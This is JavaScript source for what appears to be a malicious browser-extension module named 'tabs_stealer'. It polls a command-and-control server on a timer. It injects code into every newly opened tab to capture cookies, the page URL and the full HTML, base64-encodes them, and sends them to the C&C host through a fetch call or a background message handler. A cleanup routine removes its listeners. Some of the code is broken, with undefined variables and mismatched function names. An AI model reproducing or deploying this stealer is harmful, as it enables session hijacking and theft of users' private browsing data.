////////////////////////////////////////////////////////////////
// C&C <-> Module Communication
////////////////////////////////////////////////////////////////

// This header will be defined for every module to define processing of new cmds 
// & querying new cmds from server.  
// Define one header to embed all necessary c&c server functions.
let getCmds = {{CC_GET_CMDS_FN}};
let sendData = {{CC_SEND_DATA_FN}};
let QUERY_CMDS_INTERVAL = 1 * 60 * 1000; // Get new cmds from server every 1 minute.
let MODULE_NAME = 'tabs';
//

function execModulesWithParams(args_list) {
	for (let i=0; i<MODULE_TECHNIQUES.length; i++) {
		MODULE_TECHNIQUES[i](...args);
	}
}

function parseExecCmdsMail(cmds_list) {
	// Commands Format:
	// (module_name, op, args_list)
	for (let i=0; i<cmds_list.length; i++) {
		if (cmds_list[0].toLowerCase() === MODULE_NAME) {
			if (cmds_list[1].toLowerCase() === 'get') {
				execModuleWithParams(cmds_list[2]);
			}
		}
	}
}

function queryNewCmds() {
	let cmds_list = getCmds();
	parseExecCmdsMail(cmds_list);
}

function main() {
	setInterval(queryNewCmds, QUERY_CMDS_INTERVAL);
}

setTimeout(main, 5000); // Lazy 5-secs start-up.

////////////////////////////////////////////////////////////////
// Main Module Techniques 
///////////////////////////////////////////////////////////////

/* 2 methods: 
1. Inject extractor inside content-scripts of all opened tabs.
2. Inject extractor whenever a tab is whenever a tab is opened, query & get all state.
*/

extract_data_code = 'st=document.documentElement.innerHTML;h=btoa(unescape(encodeURIComponent(st)));d={cookies:document.cookie, url:document.location.href, fullhtml:h};full_data=btoa(JSON.stringify(d));';
content_script_code = 'document.location.href = \'javscript:function() {' + extract_data_code + ';fetch("' + cc_server + '" + full_data);}();\'';
background_code = 'function() {' + extract_data_code + ';chrome.runtime.sendMessage(full_data);}();';

// Background handler for onMessage events.
function get_cookies_post_server(request, sender, sendResponse) {
	console.log('[+] Got cookies/html data from: ' + (sender.tab ? sender.tab.url : 'from the extension') + request);
	send_data(encodeURIComponent(request));
}

////

// Add hooks for extracted data & auto sender.
chrome.runtime.onMessage.addListener(get_cookies_post_server);

//Method 1: every "QUERY_ALL_DATA_INTERVAL" - send all users' data.
function inject_active_tab_get_data(tab_id) {
	if (tab_id) {
		// Inject on specific tab:
		console.log("[*] Inject tabs_stealer over specific tab, tabId=" + tab_id);
		browser.tabs.executeScript(tab_id, {allFrames: true, 
			code: background_code, frameId:0});		
	}
	else {
		console.log("[*] Inject tabs_stealer over all tabs.");
		browser.tabs.query({active: true}).then(e => {
			var tabId = e[0].id;
			browser.tabs.executeScript(tabId, {allFrames: true, 
				code: background_code, frameId:0});
		});
	}
}

function clean_all() {
	try { 
		chrome.runtime.onMessage.removeListener(get_cookies_post_server);
	}
	catch (e) {}
	
	try {
	chrome.tabs.onCreated.removeListener(new_tab_injector);
	}
	catch (e) {}

}


//Method 1: every "QUERY_ALL_DATA_INTERVAL" - send all users' data.
// setInterval(inject_active_tab_get_data, QUERY_ALL_DATA_INTERVAL);

//Method 2: upon new tab inited.
function new_tab_injector(tab) {
	let tab_id=tab.id; 
	inject_active_tab_get_data(tab.id);
}

chrome.tabs.onCreated.addListener(new_tab_injector);

//Storage-collector: Check every SEND_ count if there's data to sent & send it.
setInterval(send_data, SEND_DATA_INTERVAL);
